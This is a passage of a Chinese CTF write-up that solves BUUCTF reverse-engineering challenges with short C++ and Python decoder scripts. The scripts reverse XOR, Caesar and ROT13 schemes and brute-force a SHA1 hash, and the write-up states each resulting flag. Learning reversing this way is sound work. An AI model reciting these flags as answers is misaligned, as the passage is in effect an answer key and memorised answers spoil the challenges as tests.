class="type">int</span> temp = paramView[<span class="number">31</span>-i];</span><br><span class="line">        paramView[<span class="number">31</span>-i] = paramView[i];</span><br><span class="line">        paramView[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; paramView;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：59acc538825054c7de4b26440c0999dd</p><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>在<a href="http://www.tool.lu/pyc/">www.tool.lu/pyc/</a> 中打开pyc文件，可以将其变成py文件，但是内容嘛……<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/pyre1.png"><br>写一个简单的脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">0x1f</span>,<span class="number">0x12</span>,<span class="number">0x1d</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x14</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="number">0x1b</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="number">0x13</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">21</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i] = ans[i] ^ ans[i+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">32</span>; j &lt; <span class="number">128</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((j + i) % <span class="number">128</span> % <span class="number">128</span> == ans[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; <span class="built_in">char</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：Just_Re_1s_Ha66y!</p><h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h2><p>这题有壳，但是upx -d可以解决，所以脱以下子：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Deasyre1.png"><br>进去看见这个：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Deasyre2.png"><br>发现v10和v6应当是连在一起的，给他们make array一下：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Deasyre3.png"><br>之后使用我们在小学二年级就会的知识写个代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> key[<span class="number">99</span>] = &#123;<span class="number">126</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">119</span>, <span class="number">118</span>, <span class="number">117</span>, </span><br><span class="line">  <span class="number">116</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">106</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">100</span>,  <span class="number">99</span>,  <span class="number">98</span>,  <span class="number">97</span>, </span><br><span class="line">   <span class="number">96</span>,  <span class="number">95</span>,  <span class="number">94</span>,  <span class="number">93</span>,  <span class="number">92</span>,  <span class="number">91</span>,  <span class="number">90</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">87</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">85</span>,  <span class="number">84</span>,  <span class="number">83</span>,  <span class="number">82</span>,  <span class="number">81</span>,  <span class="number">80</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">77</span>, </span><br><span class="line">   <span class="number">76</span>,  <span class="number">75</span>,  <span class="number">74</span>,  <span class="number">73</span>,  <span class="number">72</span>,  <span class="number">71</span>,  <span class="number">70</span>,  <span class="number">69</span>,  <span class="number">68</span>,  <span class="number">67</span>, </span><br><span class="line">   <span class="number">66</span>,  <span class="number">65</span>,  <span class="number">64</span>,  <span class="number">63</span>,  <span class="number">62</span>,  <span class="number">61</span>,  <span class="number">60</span>,  <span class="number">59</span>,  <span class="number">58</span>,  <span class="number">57</span>, </span><br><span class="line">   <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">54</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">49</span>,  <span class="number">48</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">46</span>,  <span class="number">45</span>,  <span class="number">44</span>,  <span class="number">43</span>,  <span class="number">42</span>,  <span class="number">41</span>,  <span class="number">40</span>,  <span class="number">39</span>,  <span class="number">38</span>,  <span class="number">37</span>, </span><br><span class="line">   <span class="number">36</span>,  <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">34</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt;= <span class="number">94</span>; j++)</span><br><span class="line">          &#123;</span><br><span class="line">    <span class="keyword">if</span>(ans[i] == key[j])</span><br><span class="line">    &#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">char</span>(j + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：U9X_1S_W6@T?</p><h2 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h2><p>APKIDE弄出来的伪代码很奇怪，所以又找了一个高级的JEB用：、<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/findit1.png"><br>是一个凯撒加密：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ans[i] &gt;= <span class="number">65</span> &amp;amp;&amp;amp; ans[i] &lt;= <span class="number">90</span> || ans[i] &gt;= <span class="number">97</span> &amp;amp;&amp;amp; ans[i] &lt;= <span class="number">0x7A</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans[i] += <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] &gt; <span class="number">90</span> &amp;amp;&amp;amp; ans[i] &lt; <span class="number">97</span> || ans[i] &gt;= <span class="number">0x7A</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans[i] -= <span class="number">26</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">char</span>(ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：c164675262033b4c49bdf7f9cda28a75</p><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>不是很能理解逆向里面放rsa的意图<br>得到flag：decrypt_256</p><h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>拖进IDA进行一个array的make和一个名字的改，得到这个东西：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Drome1.png"><br>在进行一个代码的写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> key[<span class="number">99</span>] = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>;</span><br><span class="line"><span class="type">int</span> i, j, tmp;</span><br><span class="line"><span class="type">bool</span> f;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = (j - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = (j - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp == key[i])</span><br><span class="line">&#123;</span><br><span class="line">f = <span class="literal">false</span>;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; key[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：Cae3ar_th4_Gre@t</p><h2 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h2><p>我不理解，你逆向就好好逆向呗，搞个网页干什么……<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BFlareOn4%5Dlogin1.png"><br>边查代码边猜意思，写个脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> tmp, k;</span><br><span class="line"><span class="type">bool</span> f;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;z&#x27;</span>) || (j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">k = j;</span><br><span class="line"><span class="keyword">if</span>(k &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = <span class="number">90</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">tmp = <span class="number">122</span>;</span><br><span class="line">&#125;</span><br><span class="line">k += <span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp &lt; k)</span><br><span class="line">&#123;</span><br><span class="line">k -= <span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(k == ans[i])</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(j);</span><br><span class="line">f = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; ans[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<a href="mailto:&#x43;&#x6c;&#x69;&#x65;&#x6e;&#x74;&#x53;&#x69;&#100;&#x65;&#76;&#x6f;&#x67;&#x69;&#x6e;&#x73;&#x41;&#x72;&#x65;&#69;&#97;&#x73;&#121;&#64;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#111;&#x6e;&#46;&#x63;&#111;&#x6d;">&#x43;&#x6c;&#x69;&#x65;&#x6e;&#x74;&#x53;&#x69;&#100;&#x65;&#76;&#x6f;&#x67;&#x69;&#x6e;&#x73;&#x41;&#x72;&#x65;&#69;&#97;&#x73;&#121;&#64;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#111;&#x6e;&#46;&#x63;&#111;&#x6d;</a></p><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>很牛逼的一道题。进去可以看到又两次加密：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/CrackRTF1.png"><br>第一次是SHA1，且输入要求是大于100000的数，可以爆破，第二部分是MD5，其实也可以爆破<a href="http://www.somd5.com/">www.somd5.com</a> 很好用。但是题目的本意是跟踪sub_40100F()：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/CrackRTF2.png"><br>经过百度，它是将一个叫AAA的资源与输入进行异或（在sub_401005()中），然后再将它怎么操作一番写入dbapp.rtf文件，推测文件的前几位就是rtf文件的文件头。可以写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">passwd1 = <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line">passwd2 = <span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span></span><br><span class="line">suffix = <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">aaa = [<span class="number">0x5</span>, <span class="number">0x7d</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x1</span>]</span><br><span class="line">rtf_header = [<span class="number">0x7b</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x31</span>]</span><br><span class="line"></span><br><span class="line">pass1 = <span class="string">&quot;&quot;</span></span><br><span class="line">pass2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">1000000</span>):</span><br><span class="line">    instr = <span class="built_in">str</span>(i) + suffix</span><br><span class="line">    res = hashlib.sha1(instr.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> res == passwd1:</span><br><span class="line">        pass1 = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1 = &quot;</span>, pass1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    res = aaa[i] ^ rtf_header[i]</span><br><span class="line">    pass2 += <span class="built_in">chr</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;passwd2 = &quot;</span>, pass2)</span><br></pre></td></tr></table></figure><p>得到密码后运行一遍，在dbapp.rtf文件中得到flag：N0_M0re_Free_Bugs<br>但是它在创建文件的时候为什么会把flag写进去呢？在源代码中flag是以什么样的形式储存的呢？</p><h2 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h2><p>有壳，但是可以upx -d：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BGUET-CTF2019%5Dre1.png"><br>点进去通过shift+F12获取关键字，跳转到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BGUET-CTF2019%5Dre2.png"><br>点进sub_4009AE函数，它会让你做32个乘法题，鼓捣鼓捣发现a1[6]不见了，所以爆破一下得到flag：e165421110ba03099a1c039337</p><h2 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h2><p>拖进IDA发现：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BWUSTCTF2020%5Dlevel11.png"><br>再根据提供的输出文档，写一个简单的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans[<span class="number">99</span>] = &#123;<span class="number">0</span>,<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i &amp;amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(ans[i] / i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(ans[i] &gt;&gt; i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：d9-dE6-20c</p><h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>起始函数很抽象，shift+F12寻找特征字符串，跟进发现：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DeasyRE1.png"><br>它做了10次base64加密，经过解密得到：<a href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a><br>好，被骗了。。。<br>开始往前搜索信息：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DeasyRE2.png"><br>把这一坨东西给他异或回去得到：Info:The first four chars are `flag`<br>怎么说呢，既有用，又没用。。。<br>不过在跟进off_6CC090中发现了这两个被函数调用过的给定数组：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DeasyRE3.png"><br>跟进函数看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DeasyRE4.png"><br>解读出v4这个东西异或之后首位是f，末位是g，推测整体异或之后是“flag”，反向把v4解出来，再讲for循环异或回去：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 